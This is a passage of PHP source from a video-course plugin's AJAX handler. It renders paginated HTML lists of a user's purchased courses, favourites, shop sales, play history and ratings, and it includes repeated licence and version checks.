			$timestr='<font color=#999>'.date('Y-m-d H:i:s', $it618_video_goods_time['it618_etime']).'</font>';
		}

		if($_GET['ac1']=='pcmygoods'){
			$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
			
			$goods_get.='<tr class="hover">
						<td><div style="line-height:18px"><a href="'.$tmpurl.'" target="_blank">'.$it618_video_goods['it618_name'].'</a><br><font color=#999>'.$goodsabout['about'].'</font></div></td>
						<td>'.$goodsabout['type'].'</td>
						<td>'.$videopower.'</td>
						<td>'.$timestr.'</td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmygoods'){
			
			$tmpurl=it618_video_getrewrite('video_wap','product@'.$it618_video_goods['id'],'plugin.php?id=it618_video:wap&pagetype=product&cid='.$it618_video_goods['id']);
			$goods_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_video_goods['it618_name'].'" style="font-size:14px;color:#333">'.$it618_video_goods['it618_name'].'</a><br>
							<font color="#999">'.$goodsabout['about'].'</font><br>
							<span style="float:right">'.$videopower.'</span><font color="#999">'.$goodsabout['type'].'</font> '.$timestr.'
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmygoods'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_video_getlang('s671')."<font color=red>$count</font>"."it618_split".$goods_get."it618_split".$multipage;
}


if($_GET['ac']=="collectgoods_get"){
	if($_GET['ac1']=='pcmygoods')$ppp = 10;
	if($_GET['ac1']=='wapmygoods')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$count=C::t('#it618_video#it618_video_collect')->count_by_search(0,'','',it618_video_utftogbk($_GET['pname']),$uid);
	
	$funname='getmycollectlist';

	$n=0;
	foreach(C::t('#it618_video#it618_video_collect')->fetch_all_by_search(0,'','t.id desc',it618_video_utftogbk($_GET['pname']),$uid,$startlimit,$ppp) as $it618_video_collect) {
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$pid=$it618_video_collect['it618_pid'];
		$goodsabout=it618_video_getgoodsabout($pid,0,0);

		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($pid);
		
		$timestr='<font color=#999>'.date('Y-m-d H:i:s', $it618_video_collect['it618_time']).'</font>';

		if($_GET['ac1']=='pcmygoods'){
			$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
			
			$goods_get.='<tr class="hover">
						<td><div style="line-height:18px"><a href="'.$tmpurl.'" target="_blank">'.$it618_video_goods['it618_name'].'</a><br><font color=#999>'.$goodsabout['about'].'</font></div></td>
						<td><a href="javascript:" onclick="delcollect('.$it618_video_collect['id'].')">'.it618_video_getlang('s1655').'</a></td>
						<td>'.$timestr.'</td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmygoods'){
			
			$tmpurl=it618_video_getrewrite('video_wap','product@'.$it618_video_goods['id'],'plugin.php?id=it618_video:wap&pagetype=product&cid='.$it618_video_goods['id']);
			$goods_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_video_goods['it618_name'].'" style="font-size:14px;color:#333">'.$it618_video_goods['it618_name'].'</a><br>
							<font color="#999">'.$goodsabout['about'].'</font><br>
							<br>
							<a href="javascript:" style="float:right" onclick="delcollect('.$it618_video_collect['id'].')">'.it618_video_getlang('s1655').'</a>'.$timestr.'
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmygoods'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_video_getlang('s671')."<font color=red>$count</font>"."it618_split".$goods_get."it618_split".$multipage;
}


if($_GET['ac']=="shopgoods_get"){
	if($_GET['ac1']=='pcshopgoods')$ppp = 12;
	if($_GET['ac1']=='wapshopgoods')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$count=C::t('#it618_video#it618_video_goods_time')->count_by_search($ShopId,'','t.it618_etime desc',it618_video_utftogbk($_GET['pname']),$_GET['finduid']);
	
	$funname='getshopgoodslist';
	$jfname=$_G['setting']['extcredits'][$it618_video['video_credit']]['title'];

	$n=0;
	foreach(C::t('#it618_video#it618_video_goods_time')->fetch_all_by_search($ShopId,'','t.it618_etime desc',it618_video_utftogbk($_GET['pname']),$_GET['finduid'],$startlimit,$ppp) as $it618_video_goods_time) {
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;

		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_goods_time['it618_pid']);
		
		if($it618_video_goods_time['it618_etime']==0){
			$videopower='<font color=#390>'.$it618_video_lang['s1161'].'</font>';
			$timestr='';
		}else{
			if($_G['timestamp']<$it618_video_goods_time['it618_etime']){
				$videopower=it618_video_getpowertime($it618_video_goods_time['it618_etime']);
				$videopower='<font color=blue>'.$videopower[0].$videopower[1].'</font>';
			}else{
				$videopower='<font color=red>'.$it618_video_lang['s1162'].'</font>';
			}
			$timestr='<font color=#999>'.date('Y-m-d H:i:s', $it618_video_goods_time['it618_etime']).'</font>';
		}
		
		$salecount=C::t('#it618_video#it618_video_sale')->count_by_uid_pid($it618_video_goods_time['it618_uid'],$it618_video_goods_time['it618_pid']);

		if($_GET['ac1']=='pcshopgoods'){
			$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
			
			$goods_get.='<tr class="hover">
						<td><div style="height:28px;line-height:28px"><a href="'.$tmpurl.'" target="_blank">'.$it618_video_goods['it618_name'].'</a> <font color=#999>'.it618_video_getvideocounttime($it618_video_goods['it618_videocount'],$it618_video_goods['it618_videotime']).'</font></div></td>
						<td><a href="'.it618_video_rewriteurl($it618_video_goods_time['it618_uid']).'" target="_blank">'.it618_video_getusername($it618_video_goods_time['it618_uid']).'</a></td>
						<td>'.$salecount.'</td>
						<td>'.$videopower.'</td>
						<td>'.$timestr.'</td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapshopgoods'){
			
			$tmpurl=it618_video_getrewrite('video_wap','product@'.$it618_video_goods['id'],'plugin.php?id=it618_video:wap&pagetype=product&cid='.$it618_video_goods['id']);
			$goods_get.='<dd style="margin:0;padding:0;padding-top:13px;padding-bottom:0px">
						<div class="dealcard" style="margin:0;padding:0;font-size:13px;line-height:15px">
							<a href="'.$tmpurl.'" target="_blank"><img class="lazy" data-original="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" style="float:left;margin-right:6px;border-radius:3px;" width="108" height="68"/></a>
							<div class="dealcard-video single-line" style="font-size:13px"><a href="'.$tmpurl.'" target="_blank">'.$it618_video_goods['it618_name'].'</a></div>
							
							<div class="titlemysalebtn text-block" style="text-align:left;line-height:17px"><font color=#999>'.it618_video_getvideocounttime($it618_video_goods['it618_videocount'],$it618_video_goods['it618_videotime']).'<br>'.$it618_video_lang['s724'].':'.$salecount.'<br></font><span style="float:right">'.$videopower.'</span>'.$timestr.'</div>

						</div>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcshopgoods'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /></td>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_video_getlang('s671')."<font color=red>$count</font>"."it618_split".$goods_get."it618_split".$multipage;
}


if($_GET['ac']=="playlist_get"){
	if($_GET['ac1']=='pcmyplay')$ppp = 10;
	if($_GET['ac1']=='wapmyplay')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$count = C::t('#it618_video#it618_video_play')->count_by_search('','',0, $uid, $_GET['pid'], $_GET['vid']);
	
	$funname='getmyplaylist';

	$n=0;
	foreach(C::t('#it618_video#it618_video_play')->fetch_all_by_search(
		'','it618_etime desc',0, $uid, $_GET['pid'], $_GET['vid'], '',$startlimit,$ppp
	) as $it618_video_play) {
		
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;

		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_play['it618_pid']);
		
		$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
		$pnamestr='<a href="'.$tmpurl.'" target="_blank"><font color=#333>'.$it618_video_goods['it618_name'].'</font></a>';
		
		$it618_video_goods_video = C::t('#it618_video#it618_video_goods_video')->fetch_by_id($it618_video_play['it618_vid']);
		$aname='';
		if($it618_video_play['it618_aid']>0){
			$it618_video_goods_video_audio = C::t('#it618_video#it618_video_goods_video_audio')->fetch_by_id($it618_video_play['it618_aid']);
			$aname=$it618_video_goods_video_audio['it618_name'];
		}
		
		$tmpurl=it618_video_getrewrite('video_lesson',$it618_video_goods_video['id'],'plugin.php?id=it618_video:lesson&lid='.$it618_video_goods_video['id']);
		if($it618_video_goods_video['it618_liveid']>0){
			$it618_tmp=C::t('#it618_video#it618_video_live')->fetch_by_id($it618_video_goods_video['it618_liveid']);
			
			$vnamestr=$it618_tmp['it618_name'];
			if($it618_tmp['it618_btime']<$_G['timestamp']&&$_G['timestamp']<$it618_tmp['it618_etime']){
				$vnamestr='<a href="'.$tmpurl.'" target="_blank">'.$it618_tmp['it618_name'].'</a>';
			}
		}else{
			$vnamestr='<a href="'.$tmpurl.'" target="_blank">'.$it618_video_goods_video['it618_name'].' '.$aname.'</a>';
		}
		
		$playtime='';$curtime='';
		if($it618_video_play['it618_playtime']>0){
			$playtime=it618_video_getvideotime($it618_video_play['it618_playtime']);
			$curtime='<font color=#098fc8>'.it618_video_getplaytime($it618_video_play['it618_curtime']).'</font> / '.it618_video_getplaytime($it618_video_play['it618_alltime']);
		}
		
		$pid=$it618_video_goods_video['it618_pid'];
		$lid=$it618_video_goods_video['it618_lid'];
		$vid=$it618_video_goods_video['id'];
		$goodsabout=it618_video_getgoodsabout($pid,$lid,$vid);

		if($_GET['ac1']=='pcmyplay'){
			
			$playlist_get.='<tr class="hover">
					<td>'.$pnamestr.'<br><font color="#999">'.$goodsabout['about'].'</font></td>
					<td>'.$playtime.'</td>
					<td>'.$curtime.'</td>
					<td><font color=#999>'.date('Y-m-d H:i:s', $it618_video_play['it618_btime']).'<br>'.date('Y-m-d H:i:s', $it618_video_play['it618_etime']).'</font></td>
					</tr>';
		}
		
		if($_GET['ac1']=='wapmyplay'){
			
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			
			$tmpurl=it618_video_getrewrite('video_wap','product@'.$it618_video_goods['id'],'plugin.php?id=it618_video:wap&pagetype=product&cid='.$it618_video_goods['id']);
			$playlist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_video_goods['it618_name'].'" style="font-size:14px;color:#333">'.$it618_video_goods['it618_name'].'</a><br>
							<font color="#999">'.$goodsabout['about'].'</font><br>
							<font color=#999>'.date('Y-m-d H:i:s', $it618_video_play['it618_btime']).' - '.date('Y-m-d H:i:s', $it618_video_play['it618_etime']).'</font><br>
							<font color=#999><span style="float:right">'.$playtime.'</span>'.$curtime.'</font>
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmyplay'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_video_getlang('s671')."<font color=red>$count</font>"."it618_split".$playlist_get."it618_split".$multipage;
}


if($_GET['ac']=="playpjlist_get"){
	if($_GET['ac1']=='pcmyplaypj')$ppp = 11;
	if($_GET['ac1']=='wapmyplaypj')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$count=C::t('#it618_video#it618_video_play_pj')->count_by_search('','',0,$uid,it618_video_utftogbk($_GET['pname']));
	
	$funname='getmyplaypjlist';
	
	$jfname=$_G['setting']['extcredits'][$it618_video['video_credit']]['title'];

	$n=0;
	foreach(C::t('#it618_video#it618_video_play_pj')->fetch_all_by_search('','p.it618_time desc',0,$uid,it618_video_utftogbk($_GET['pname']),$startlimit,$ppp) as $it618_video_play_pj) {
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;

		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_play_pj['it618_pid']);
		
		$pj='';$it618_pjjl='';
		if($it618_video_play_pj['it618_score1']==0){
			if($_G['timestamp']-$it618_video['video_pjtimecount']*3600*24>$it618_video_play_pj['it618_time']){
				$pj='<a href="javascript:" onclick="setplaypj('.$it618_video_play_pj['id'].')">'.it618_video_getlang('s708').'</a>';
			}
		}else{
			$pjname=C::t('#it618_video#it618_video_class1')->fetch_it618_pj_by_id($it618_video_goods['it618_class1_id']);
			$pjname=explode("_",$pjname);
		
			$pj='<span title="'.$pjname[0].''.$it618_video_play_pj['it618_score1'].it618_video_getlang('s501').' '.$pjname[1].''.$it618_video_play_pj['it618_score2'].it618_video_getlang('s501').' '.$pjname[2].''.$it618_video_play_pj['it618_score3'].it618_video_getlang('s501').' '.$pjname[3].''.$it618_video_play_pj['it618_score4'].it618_video_getlang('s501').' '.str_replace('[br]','',$it618_video_play_pj["it618_content"]).'"><font color="#FF6600"><strong>'.$it618_video_play_pj['it618_score1'].'</strong></font>'.it618_video_getlang('s501').' '.$it618_video_play_pj['it618_score2'].it618_video_getlang('s501').' '.$it618_video_play_pj['it618_score3'].it618_video_getlang('s501').' '.$it618_video_play_pj['it618_score4'].it618_video_getlang('s501').'</span>';
		}
		
		if($it618_video_play_pj['it618_pjjl']>0){
			$it618_pjjl='<font color=#f60>'.$it618_video_play_pj['it618_pjjl'].'</font>'.$jfname;
		}

		if($_GET['ac1']=='pcmyplaypj'){
			$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
			
			$playpjlist_get.='<tr class="hover">
						<td><div style="height:28px;line-height:28px"><a href="'.$tmpurl.'" target="_blank">'.$it618_video_goods['it618_name'].'</a> <font color=#999>'.it618_video_getvideocounttime($it618_video_goods['it618_videocount'],$it618_video_goods['it618_videotime']).'</font></div></td>
						<td>'.$pj.'</td>
						<td>'.$it618_pjjl.'</td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_video_play_pj['it618_time']).'</font></td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmyplaypj'){
			
			if($it618_pjjl!=''){
				$it618_pjjl=$it618_video_lang['t16'].$it618_pjjl;
			}
			
			$tmpurl=it618_video_getrewrite('video_wap','product@'.$it618_video_goods['id'],'plugin.php?id=it618_video:wap&pagetype=product&cid='.$it618_video_goods['id']);
			$playpjlist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_video_goods['it618_name'].'" style="font-size:14px;color:#333">'.$it618_video_goods['it618_name'].'</a><br>
							<font color=#999>'.it618_video_getvideocounttime($it618_video_goods['it618_videocount'],$it618_video_goods['it618_videotime']).'</font><br>
							<font color=#999>'.date('Y-m-d H:i:s', $it618_video_play_pj['it618_time']).'</font><br>
							<font color=#999><span style=";float:right">'.$it618_pjjl.'</span>'.$pj.'</font>
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmyplaypj'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
